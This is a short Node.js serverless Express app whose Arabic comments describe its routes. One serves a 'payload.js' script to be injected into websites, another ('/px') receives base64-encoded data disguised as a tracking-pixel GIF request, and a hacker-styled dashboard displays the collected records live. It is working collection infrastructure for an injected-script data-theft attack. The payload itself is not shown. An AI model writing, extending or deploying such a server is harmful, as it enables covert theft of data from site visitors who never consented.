const express = require("express");
const serverless = require("serverless-http");
const fs = require("fs");
const path = require("path");
const app = express();
let logs = [];

// 1. مسار إرسال السكريبت للموقع
app.get("/payload.js", (req, res) => {
    const filePath = path.join(__dirname, "payload.js");
    fs.readFile(filePath, "utf8", (err, data) => {
        if (err) { res.status(500).send("Error"); return; }
        res.setHeader("Content-Type", "application/javascript");
        res.send(data);
    });
});

// 2. مسار استقبال البيانات
app.get("/px", (req, res) => {
    let d = req.query.d;
    if (d) {
        try {
            let data = JSON.parse(Buffer.from(d, "base64").toString());
            logs.unshift({ time: new Date().toLocaleString(), ...data });
        } catch(e) {}
    }
    const img = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
    res.writeHead(200, { "Content-Type": "image/gif" }).end(img);
});

// 3. لوحة التحكم
app.get("/dashboard", (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Dashboard</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
<h2>⚡ DASHBOARD</h2>
<button onclick="fetch('/data').then(r=>r.json()).then(d=>document.getElementById('logs').innerHTML=d.map(x=>'<p>['+x.time+'] '+JSON.stringify(x)+'</p>').join(''))">REFRESH</button>
<hr><div id="logs"></div>
<script>setInterval(()=>fetch('/data').then(r=>r.json()).then(d=>document.getElementById('logs').innerHTML=d.map(x=>'<p>['+x.time+'] '+JSON.stringify(x)+'</p>').join('')),2000);</script>
</body>
</html>`);
});

app.get("/data", (req, res) => res.json(logs));
app.get("/", (req, res) => res.send("System ready"));

module.exports.handler = serverless(app);
